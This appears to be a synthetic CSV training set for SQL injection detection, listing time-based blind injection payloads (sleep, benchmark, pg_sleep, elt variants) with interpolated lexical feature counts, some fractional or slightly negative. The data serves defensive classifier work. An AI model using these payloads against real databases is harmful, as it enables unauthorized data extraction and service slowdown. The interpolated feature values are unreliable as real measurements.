id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",nearest_attack_euclidean,R000073,0.1487135917193426,84.4473163658392,29.0,3.949383531514523,31.0,15.0,28.557853092671355,9.889463273167838,0.36722546950867424,0.17768974331064885,0.338006667392313,0.11707811978836388,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.889463273167839,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000111,0.1074962197754313,65.41645648394194,19.0,2.855252808988618,11.0,10.0,34.333165187153554,10.083291296788389,0.168223951357503,0.1529308648704573,0.5247244432331769,0.15412074053886282,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0832912967883885,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000133,0.42690849262415925,68.16271900360674,25.837280996393257,3.613703194410386,23.162719003606743,10.0,28.0,7.0,0.33979589837218743,0.14671202258395835,0.4107936632350834,0.10269841580877084,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.16271900360674374,0.8372809963932564,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000014,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000089,0.2843661769575524,64.7593210496568,26.379660524828406,3.8879347828340927,23.607456839725447,10.0,21.15186420993136,10.0,0.36389629510141935,0.1546467038647449,0.3268102971690908,0.1546467038647449,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,0.07593210496568092,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0759321049656805
SMOTE_000015,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,0.336361058572759,77.12615655995774,22.25231311991547,3.3276600359614052,15.126156559957735,18.0,34.0,10.0,0.19610751027595397,0.23338814217794884,0.4408442685583478,0.12966007898774934,1.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.12615655995773456,0.8738434400422654,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.042069208050483566,76.08820349059803,22.014700581766338,3.1585773283402676,19.0,10.0,37.05880232706535,10.029401163532677,0.24973108691890844,0.13143741416784654,0.4870355339706097,0.1317959649426353,0.0,0.014700581766338261,2.0,0.0,0.0,1.0,0.0,6.014700581766338,0.0,1.0,0.0,3.0,0.0,0.014700581766338316,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000017,attack,time,1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',nearest_attack_euclidean,R000241,0.9208751532474015,82.65580619517395,28.311612390347904,3.8789429220920817,30.655806195173952,10.0,29.0,13.0,0.37086422599897817,0.12098764884635035,0.350864181654416,0.15728394350025546,4.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,1.0,0.6558061951739521,0.344193804826048,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000018,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000209,0.3600439013776865,79.50585661178896,27.0,3.6962462097645767,23.0,15.0,30.4215471764908,11.08430943529816,0.2909533115114994,0.18975215968141268,0.3800365074277364,0.1392580213793515,0.0,3.0,0.0,0.0,0.0,1.0,0.0,5.08430943529816,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000019,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",nearest_attack_euclidean,R000232,1.041259970543356,83.44451190513426,21.88902381026852,3.3327765579968878,23.77804762053704,10.0,37.11097618973148,12.55548809486574,0.28482482653350844,0.11984436043440294,0.4448249528618202,0.15050586017026835,0.0,3.999999999999999,0.0,0.0,0.0,1.5554880948657395,0.0,6.0,0.0,0.0,1.0,1.5554880948657395,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,time,1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',nearest_attack_euclidean,R000241,1.2763505500076462,80.52820325420774,27.764101627103873,3.851407425007365,29.146152440655808,10.0,28.382050813551935,13.0,0.3610853577018461,0.12445268553540925,0.35267346556671264,0.16178849119603203,4.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,0.691025406775968,0.6910254067759679,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.382050813551936
SMOTE_000021,attack,time,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",nearest_attack_euclidean,R000290,0.9718129485491395,78.33930229966136,20.6427908013546,3.0811120269873102,13.33930229966135,18.0,38.0,9.0,0.1702458048487484,0.22977808481111583,0.48508706793457784,0.11488904240555792,0.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.33930229966135,0.6606977003386498,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000022,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000010,0.7358345328505609,69.60875465661618,27.60875465661618,3.844819997899351,16.0,21.0,24.0,8.608754656616181,0.2298674793983729,0.30170106671036445,0.34480121909755934,0.12363023479370332,0.0,1.0,0.0,0.0,0.0,1.0,0.0,4.0,0.6087546566161812,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000143,0.5439041362979538,69.97817589556277,26.0,3.7007177517570327,15.0,22.0,25.582540716450218,7.3956351791125545,0.21461066913105525,0.3147623147255477,0.36505571056106134,0.10557130558233568,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.3956351791125545,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000024,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000308,0.5632055233624671,69.78381636555741,19.0,2.766678186280874,10.783816365557412,10.0,38.0,11.0,0.15450210467244044,0.14330472802162025,0.5445579664821569,0.1576352008237823,1.0,0.0,0.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.7838163655574105,0.21618363444258948,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000264,0.17201824991387032,78.20600466377242,19.93133177874253,2.980418705165368,27.0,2.0,39.20600466377242,10.0,0.3452734843428529,0.025575813655026147,0.5012716337269902,0.1278790682751307,0.0,0.9313317787425275,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.068668221257472,0.0,0.0,0.0,1.0,0.0,0.9313317787425275,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000026,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000018,1.2423318639779657,72.52233237927655,28.0,3.8434751581592415,19.0,21.52233237927654,25.0,7.0,0.26200070106425905,0.2967349603011994,0.34473776455823557,0.09652657407630597,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.5223323792765449,0.47766762072345514,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000027,attack,time,"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,nearest_attack_euclidean,R000240,1.829656394627261,79.10492130640978,26.276230326602445,3.703472199210176,17.638115163301222,20.276230326602445,29.276230326602445,11.91434548990367,0.22320976596495126,0.25633611393322264,0.37038616473123054,0.15006795537059553,0.0,2.9143454899036696,0.0,0.0,0.0,1.6381151633012232,0.0,4.361884836698777,1.6381151633012232,0.0,1.0,1.6381151633012232,0.0,1.0,0.0,0.3618848366987768,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.6381151633012232,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.638115163301223
SMOTE_000028,attack,time,"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000237,1.0174084684654934,67.89393099931563,23.526517250171093,3.4722635235927486,19.0,10.0,28.893930999315632,10.0,0.28008989415865865,0.14741573376771508,0.4250786383059112,0.14741573376771508,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.473482749828908,0.5265172501710922,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000029,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000307,1.3899669710253097,66.45987616387528,23.946501551833702,3.4849757405025343,20.946501551833702,10.0,28.513374612041574,7.0,0.3146572293564616,0.15054326659756725,0.4294192174276741,0.10538028661829707,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.5133746120415745,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.48662538795842525,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000030,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000281,0.32334266421402724,73.21501231183755,22.0,3.3809202259293447,15.0,18.0,30.972009849470048,9.243002462367512,0.20504596235974687,0.24605515483169624,0.42271542925806577,0.12618345355049113,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.243002462367512,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000031,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000072,0.5070842476831282,68.43458364151783,25.0,3.662012126320671,23.28270817924108,10.0,26.15187546227676,9.0,0.34058226100618155,0.1461882193054229,0.381660122313515,0.13156939737488058,2.14135408962054,0.0,0.0,0.0,0.0,1.0,0.0,3.85864591037946,0.0,0.0,0.0,2.85864591037946,1.0,0.0,0.0,0.14135408962054022,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8586459103794598,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.85864591037946
